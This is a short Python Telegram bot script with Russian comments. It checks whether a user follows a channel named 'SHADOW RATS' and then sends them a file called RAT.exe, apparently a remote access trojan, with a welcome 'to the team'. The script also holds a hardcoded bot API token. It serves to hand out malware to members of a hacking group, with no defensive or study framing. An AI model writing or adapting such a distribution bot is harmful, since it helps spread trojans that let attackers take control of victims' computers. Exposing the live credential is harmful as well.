import os
import telebot
from telebot import types

# Замените на ваш токен бота
API_TOKEN = '7138095299:AAH3YEgptfE-Me22NR6jpeZJZWiihXfbWPY'

# Замените на ID вашего канала
CHANNEL_ID = '-1002331312384'

# Замените на путь к вашему файлу RAT.exe
RAT_FILE_PATH = 'RAT.exe'

bot = telebot.TeleBot(API_TOKEN)

@bot.message_handler(commands=['start'])
def send_welcome(message):
    user_id = message.from_user.id
    
    # Проверка подписки на канал
    try:
        member = bot.get_chat_member(CHANNEL_ID, user_id)
        if member.status in ['member', 'creator', 'administrator']:
            bot.send_message(message.chat.id, "Добро пожаловать в команду SHADOW RATS.")
            with open(RAT_FILE_PATH, 'rb') as file:
                bot.send_document(message.chat.id, file)
        else:
            bot.send_message(message.chat.id, "Вы должны быть подписаны на канал SHADOW RATS для получения доступа.")
    except Exception as e:
        bot.send_message(message.chat.id, "Произошла ошибка при проверке подписки.")

bot.polling()
